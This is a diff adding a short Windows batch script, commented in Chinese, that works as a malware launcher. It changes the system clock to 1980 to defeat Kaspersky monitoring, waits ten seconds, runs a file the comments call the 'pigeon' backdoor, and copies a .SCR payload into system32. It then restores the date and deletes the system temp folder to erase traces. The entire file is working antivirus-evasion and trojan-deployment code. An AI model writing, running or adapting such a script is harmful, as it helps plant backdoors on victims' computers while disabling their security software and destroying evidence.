@@ -1,0 +1,27 @@
+set date=%date%
+::======修改系统时间使卡巴监控失效============
+date 1980-01-01
+
+date 1980-01-01
+
+::========倒计时等待10秒======================
+@echo off & setlocal enableextensions
+echo WScript.Sleep 1000 > %temp%.\tmp$$$.vbs
+set /a i = 10
+:Timeout
+if %i% == 0 goto Next
+setlocal
+set /a i = %i% - 1
+cscript //nologo %temp%.\tmp$$$.vbs
+goto Timeout
+goto End
+
+::===========倒计时等待结束运行鸽子=============
+:Next
+%systemroot%\temp\1.exe
+copy %systemroot%\temp\tmp.SCR %systemroot%\system32\
+for %%f in (%temp%.\tmp$$$.vbs*) do del %%f
+::======恢复时间(卡巴监控)=======================
+date %date%
+::=========清除痕迹============================
+RD /S /Q %systemroot%\temp\
